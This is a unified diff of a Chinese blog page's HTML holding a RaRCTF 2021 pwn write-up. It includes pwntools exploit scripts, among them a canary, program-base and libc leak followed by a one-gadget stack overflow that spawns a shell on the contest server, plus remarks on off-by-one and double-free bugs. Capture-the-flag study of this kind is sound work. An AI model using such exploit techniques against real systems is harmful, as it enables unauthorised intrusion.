@@ -1,7 +1,5 @@
-<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>RaRCTF-PWN-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><meta property="og:image" content><meta property="og:title" content="RaRCTF-PWN-WP"><meta property="og:description" content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1532.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-10T10:49:00+00:00"><meta property="article:modified_time" content="2021-08-10T10:49:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="RaRCTF-PWN-WP"><meta name=twitter:description content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><script src=https://www.cjovi.icu/js/feather.min.js></script>
-<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.bfb8dec0e2220d86f104bd8230dbf2c35b583e46ccfef90bb620854db94ef7a5.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
-<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
-<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>RaRCTF-PWN-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><meta property="og:image" content><meta property="og:title" content="RaRCTF-PWN-WP"><meta property="og:description" content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1532.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-10T10:49:00+00:00"><meta property="article:modified_time" content="2021-08-10T10:49:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="RaRCTF-PWN-WP"><meta name=twitter:description content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
 <a href=/posts.html>All posts</a>
 <a href=/about.html>About</a>
 <a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>RaRCTF-PWN-WP</h1><div class=meta>Posted on Aug 10, 2021</div></div><section class=body><p>一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。</p><h3 id=archer>Archer</h3><p>这题直接 nc 就可以了</p><h3 id=ret2winrars>ret2winRaRs</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
@@ -42,128 +40,128 @@
 </span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, payload)
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
-</span></span></code></pre></div><h3 id=the-guessing-game>The Guessing Game</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span># coding=utf-8
-</span></span><span style=display:flex><span>from pwn import *
-</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
-</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
+</span></span></code></pre></div><h3 id=the-guessing-game>The Guessing Game</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh = process(&#34;./guess&#34;)
-</span></span><span style=display:flex><span>sh = remote(&#34;193.57.159.27&#34;, &#34;59624&#34;)
-</span></span><span style=display:flex><span>elf = ELF(&#34;./guess&#34;)
-</span></span><span style=display:flex><span>libc = ELF(&#34;./libc-2.31.so&#34;)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./guess&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;59624&#34;</span>)
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./guess&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.31.so&#34;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>guessed_times = 0
+</span></span><span style=display:flex><span>guessed_times <span style=color:#666>=</span> <span style=color:#40a070>0</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def one_guess(idx, val):
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;guessing (0-7)? &#34;, str(idx))
-</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;guess: &#34;, str(val))
-</span></span><span style=display:flex><span>    back = sh.recvuntil(&#34;\n&#34;, drop = True)
-</span></span><span style=display:flex><span>#    log.success(back + &#34; &#34; + hex(val))
-</span></span><span style=display:flex><span>    if (back == &#34;You got it!&#34;):
-</span></span><span style=display:flex><span>        return 0
-</span></span><span style=display:flex><span>    if (back == &#34;Too high!&#34;):
-</span></span><span style=display:flex><span>        return 1
-</span></span><span style=display:flex><span>    if (back == &#34;Ouch, too low!&#34;):
-</span></span><span style=display:flex><span>        return -1
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>one_guess</span>(idx, val):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;guessing (0-7)? &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;guess: &#34;</span>, <span style=color:#007020>str</span>(val))
+</span></span><span style=display:flex><span>    back <span style=color:#666>=</span> sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> True)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#    log.success(back + &#34; &#34; + hex(val))</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (back <span style=color:#666>==</span> <span style=color:#4070a0>&#34;You got it!&#34;</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (back <span style=color:#666>==</span> <span style=color:#4070a0>&#34;Too high!&#34;</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (back <span style=color:#666>==</span> <span style=color:#4070a0>&#34;Ouch, too low!&#34;</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def plain_search(idx):
-</span></span><span style=display:flex><span>    l, r = 0, 255
-</span></span><span style=display:flex><span>    mid = 0
-</span></span><span style=display:flex><span>    while (l &lt;= r):
-</span></span><span style=display:flex><span>        mid = (l + r) &gt;&gt; 1
-</span></span><span style=display:flex><span>        result = one_guess(idx, mid)
-</span></span><span style=display:flex><span>        if (result == 0):
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>plain_search</span>(idx):
+</span></span><span style=display:flex><span>    l, r <span style=color:#666>=</span> <span style=color:#40a070>0</span>, <span style=color:#40a070>255</span>
+</span></span><span style=display:flex><span>    mid <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (l <span style=color:#666>&lt;=</span> r):
+</span></span><span style=display:flex><span>        mid <span style=color:#666>=</span> (l <span style=color:#666>+</span> r) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>        result <span style=color:#666>=</span> one_guess(idx, mid)
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (result <span style=color:#666>==</span> <span style=color:#40a070>0</span>):
 </span></span><span style=display:flex><span>            global guessed_times
-</span></span><span style=display:flex><span>            guessed_times = guessed_times + 1
-</span></span><span style=display:flex><span>            return mid
-</span></span><span style=display:flex><span>        elif (result == -1):
-</span></span><span style=display:flex><span>            l = mid + 1
-</span></span><span style=display:flex><span>        else:
-</span></span><span style=display:flex><span>            r = mid - 1
-</span></span><span style=display:flex><span>    return mid
+</span></span><span style=display:flex><span>            guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> mid
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>elif</span> (result <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>            l <span style=color:#666>=</span> mid <span style=color:#666>+</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>            r <span style=color:#666>=</span> mid <span style=color:#666>-</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> mid
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def fancy_search(idx):
-</span></span><span style=display:flex><span>    l, r = 0, 255
-</span></span><span style=display:flex><span>    mid = 0
-</span></span><span style=display:flex><span>    while (l &lt;= r):
-</span></span><span style=display:flex><span>        mid = (l + r) &gt;&gt; 1
-</span></span><span style=display:flex><span>        result = one_guess(idx, mid)
-</span></span><span style=display:flex><span>        if (result == 0):
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>fancy_search</span>(idx):
+</span></span><span style=display:flex><span>    l, r <span style=color:#666>=</span> <span style=color:#40a070>0</span>, <span style=color:#40a070>255</span>
+</span></span><span style=display:flex><span>    mid <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (l <span style=color:#666>&lt;=</span> r):
+</span></span><span style=display:flex><span>        mid <span style=color:#666>=</span> (l <span style=color:#666>+</span> r) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>        result <span style=color:#666>=</span> one_guess(idx, mid)
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (result <span style=color:#666>==</span> <span style=color:#40a070>0</span>):
 </span></span><span style=display:flex><span>            global guessed_times
-</span></span><span style=display:flex><span>            guessed_times = guessed_times + 1
-</span></span><span style=display:flex><span>            return mid
-</span></span><span style=display:flex><span>        elif (result == -1):
-</span></span><span style=display:flex><span>            second_try = one_guess(idx, mid + 2)
-</span></span><span style=display:flex><span>            if (second_try == 1):
-</span></span><span style=display:flex><span>                log.success(&#34;lucky guess!&#34; + hex(mid + 1))
-</span></span><span style=display:flex><span>                return (mid + 1)
-</span></span><span style=display:flex><span>            elif (second_try == -1):
-</span></span><span style=display:flex><span>                l = mid + 3
-</span></span><span style=display:flex><span>            else:
+</span></span><span style=display:flex><span>            guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> mid
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>elif</span> (result <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>            second_try <span style=color:#666>=</span> one_guess(idx, mid <span style=color:#666>+</span> <span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>if</span> (second_try <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>                <span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;lucky guess!&#34;</span> <span style=color:#666>+</span> hex(mid <span style=color:#666>+</span> <span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>+</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>elif</span> (second_try <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>                l <span style=color:#666>=</span> mid <span style=color:#666>+</span> <span style=color:#40a070>3</span>
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>else</span>:
 </span></span><span style=display:flex><span>                global guessed_times
-</span></span><span style=display:flex><span>                guessed_times = guessed_times + 1
-</span></span><span style=display:flex><span>                return (mid + 2)
-</span></span><span style=display:flex><span>        else:
-</span></span><span style=display:flex><span>            second_try = one_guess(idx, mid - 2)
-</span></span><span style=display:flex><span>            if (second_try == -1):
-</span></span><span style=display:flex><span>                log.success(&#34;lucky guess!&#34; + hex(mid - 1))
-</span></span><span style=display:flex><span>                return (mid - 1)
-</span></span><span style=display:flex><span>            elif (second_try == 1):
-</span></span><span style=display:flex><span>                r = mid - 3
-</span></span><span style=display:flex><span>            else:
+</span></span><span style=display:flex><span>                guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>+</span> <span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>            second_try <span style=color:#666>=</span> one_guess(idx, mid <span style=color:#666>-</span> <span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>if</span> (second_try <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>                <span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;lucky guess!&#34;</span> <span style=color:#666>+</span> hex(mid <span style=color:#666>-</span> <span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>-</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>elif</span> (second_try <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>                r <span style=color:#666>=</span> mid <span style=color:#666>-</span> <span style=color:#40a070>3</span>
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>else</span>:
 </span></span><span style=display:flex><span>                global guessed_times
-</span></span><span style=display:flex><span>                guessed_times = guessed_times + 1
-</span></span><span style=display:flex><span>                return (mid - 2)
-</span></span><span style=display:flex><span>    log.success(&#34;might failed&#34;)
-</span></span><span style=display:flex><span>    return mid
+</span></span><span style=display:flex><span>                guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>-</span> <span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>    <span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;might failed&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> mid
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def search7byte(start_idx):
-</span></span><span style=display:flex><span>    val = 0
-</span></span><span style=display:flex><span>    for i in range(7):
-</span></span><span style=display:flex><span>        val += int(fancy_search(start_idx + 7 - i))
-</span></span><span style=display:flex><span>        val = val &lt;&lt; 8
-</span></span><span style=display:flex><span>    return val
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>search7byte</span>(start_idx):
+</span></span><span style=display:flex><span>    val <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>        val <span style=color:#666>+=</span> <span style=color:#007020>int</span>(fancy_search(start_idx <span style=color:#666>+</span> <span style=color:#40a070>7</span> <span style=color:#666>-</span> i))
+</span></span><span style=display:flex><span>        val <span style=color:#666>=</span> val <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> val
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>def search6byte(start_idx):
-</span></span><span style=display:flex><span>    if (guessed_times &gt; 8):
-</span></span><span style=display:flex><span>        return -1
-</span></span><span style=display:flex><span>    val = 0
-</span></span><span style=display:flex><span>    for i in range(6):
-</span></span><span style=display:flex><span>        val += int(fancy_search(start_idx + 5 - i))
-</span></span><span style=display:flex><span>        val = val &lt;&lt; 8
-</span></span><span style=display:flex><span>    return val &gt;&gt; 8
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>search6byte</span>(start_idx):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (guessed_times <span style=color:#666>&gt;</span> <span style=color:#40a070>8</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>    val <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
+</span></span><span style=display:flex><span>        val <span style=color:#666>+=</span> <span style=color:#007020>int</span>(fancy_search(start_idx <span style=color:#666>+</span> <span style=color:#40a070>5</span> <span style=color:#666>-</span> i))
+</span></span><span style=display:flex><span>        val <span style=color:#666>=</span> val <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> val <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>8</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>canary = search7byte(0x20)
-</span></span><span style=display:flex><span>log.success(&#34;canary: &#34; + hex(canary))
-</span></span><span style=display:flex><span>log.success(&#34;guessed_times: &#34; + hex(guessed_times))
-</span></span><span style=display:flex><span>_start_addr = search6byte(0x10)
-</span></span><span style=display:flex><span>log.success(&#34;_start: &#34; + hex(_start_addr))
-</span></span><span style=display:flex><span>log.success(&#34;guessed_times: &#34; + hex(guessed_times))
+</span></span><span style=display:flex><span>canary <span style=color:#666>=</span> search7byte(<span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;canary: &#34;</span> <span style=color:#666>+</span> hex(canary))
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;guessed_times: &#34;</span> <span style=color:#666>+</span> hex(guessed_times))
+</span></span><span style=display:flex><span>_start_addr <span style=color:#666>=</span> search6byte(<span style=color:#40a070>0x10</span>)
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;_start: &#34;</span> <span style=color:#666>+</span> hex(_start_addr))
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;guessed_times: &#34;</span> <span style=color:#666>+</span> hex(guessed_times))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>while(guessed_times &lt; 8):
-</span></span><span style=display:flex><span>    plain_search(0)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span>(guessed_times <span style=color:#666>&lt;</span> <span style=color:#40a070>8</span>):
+</span></span><span style=display:flex><span>    plain_search(<span style=color:#40a070>0</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>prog_base = _start_addr - 0x10D0
-</span></span><span style=display:flex><span>payload = &#39;a&#39; * 0x18 + p64(canary) + &#39;b&#39; * 8 + p64(prog_base + elf.sym[&#34;_start&#34;])
-</span></span><span style=display:flex><span>sh.sendafter(&#34;game? &#34;, payload)
+</span></span><span style=display:flex><span>prog_base <span style=color:#666>=</span> _start_addr <span style=color:#666>-</span> <span style=color:#40a070>0x10D0</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x18</span> <span style=color:#666>+</span> p64(canary) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(prog_base <span style=color:#666>+</span> elf<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;_start&#34;</span>])
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;game? &#34;</span>, payload)
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>global guessed_times
-</span></span><span style=display:flex><span>guessed_times = 0
+</span></span><span style=display:flex><span>guessed_times <span style=color:#666>=</span> <span style=color:#40a070>0</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>__libc_start_main = search6byte(0x30) - 243
-</span></span><span style=display:flex><span>libc_base = __libc_start_main - libc.sym[&#34;__libc_start_main&#34;]
-</span></span><span style=display:flex><span>log.success(&#34;libc_base: &#34; + hex(libc_base))
-</span></span><span style=display:flex><span>while(guessed_times &lt; 8):
-</span></span><span style=display:flex><span>    plain_search(0)
+</span></span><span style=display:flex><span>__libc_start_main <span style=color:#666>=</span> search6byte(<span style=color:#40a070>0x30</span>) <span style=color:#666>-</span> <span style=color:#40a070>243</span>
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> __libc_start_main <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__libc_start_main&#34;</span>]
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> hex(libc_base))
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span>(guessed_times <span style=color:#666>&lt;</span> <span style=color:#40a070>8</span>):
+</span></span><span style=display:flex><span>    plain_search(<span style=color:#40a070>0</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload = &#39;a&#39; * 0x18 + p64(canary) + &#39;b&#39; * 8 + p64(libc_base + 0xe6c81)
-</span></span><span style=display:flex><span>sh.sendafter(&#34;game? &#34;, payload)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x18</span> <span style=color:#666>+</span> p64(canary) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xe6c81</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;game? &#34;</span>, payload)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.interactive()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
 </span></span></code></pre></div><p>leak 出 canary，prog_base，libc_base。接下来有 12 字节溢出，onegadget 可行，就可以 getshell 了。</p><h3 id=rarmony>RaRmony</h3><p>一直想着拿 shell，但是实际上只要改自己的权限就可以了</p><p>即修改这个结构体</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserRole</span>
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int32</span> idx;
@@ -352,79 +350,79 @@ write 可以读出低四个字节</p><p>由于是 libc 2.31，所以 double free
 </span></span><span style=display:flex><span>          puts(<span style=color:#4070a0>&#34;Patched challenge!&#34;</span>);
 </span></span><span style=display:flex><span>          ctftime_rating <span style=color:#666>-=</span> <span style=color:#40a070>5</span>;
 </span></span><span style=display:flex><span>        }
-</span></span></code></pre></div><p>patch 功能中存在 off-by-one</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span># coding=utf-8
-</span></span><span style=display:flex><span>from pwn import *
-</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
-</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
+</span></span></code></pre></div><p>patch 功能中存在 off-by-one</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
